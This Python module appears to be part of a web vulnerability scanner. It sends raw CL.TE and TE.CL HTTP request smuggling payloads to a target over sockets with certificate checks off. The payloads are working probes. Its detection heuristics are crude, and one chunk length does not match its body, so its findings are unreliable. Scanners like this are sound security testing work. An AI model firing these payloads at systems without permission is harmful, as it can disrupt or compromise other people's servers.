"""HTTP Request Smuggling avancé."""

from __future__ import annotations

import socket
import ssl
from urllib.parse import urlparse

from .utils import Finding, get_domain, normalize_url


class SmugglingScanner:
    """Teste CL.TE et TE.CL request smuggling."""

    def __init__(self, target: str):
        self.target = normalize_url(target)
        self.domain = get_domain(self.target)
        self.findings: list[Finding] = []

    def run_full_scan(self) -> list[Finding]:
        self._test_cl_te()
        self._test_te_cl()
        return self.findings

    def _send_raw(self, payload: bytes) -> str:
        parsed = urlparse(self.target)
        host = parsed.hostname or self.domain
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        try:
            sock = socket.create_connection((host, port), timeout=8)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.send(payload)
            response = sock.recv(8192).decode(errors="ignore")
            sock.close()
            return response
        except OSError:
            return ""

    def _test_cl_te(self) -> None:
        payload = (
            f"POST {urlparse(self.target).path or '/'} HTTP/1.1\r\n"
            f"Host: {self.domain}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()
        resp = self._send_raw(payload)
        if "400" not in resp and resp:
            self.findings.append(
                Finding(
                    title="HTTP Request Smuggling CL.TE possible",
                    severity="critical",
                    category="Request Smuggling",
                    url=self.target,
                    description="Le serveur traite CL et TE de manière ambiguë",
                    evidence=resp[:300],
                    remediation="Rejeter les requêtes avec CL+TE, utiliser HTTP/2",
                )
            )

    def _test_te_cl(self) -> None:
        payload = (
            f"POST {urlparse(self.target).path or '/'} HTTP/1.1\r\n"
            f"Host: {self.domain}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = self._send_raw(payload)
        if "405" in resp or "GPOST" in resp:
            self.findings.append(
                Finding(
                    title="HTTP Request Smuggling TE.CL détecté",
                    severity="critical",
                    category="Request Smuggling",
                    url=self.target,
                    description="Smuggling TE.CL — requête tunnelée détectée",
                    evidence=resp[:300],
                )
            )
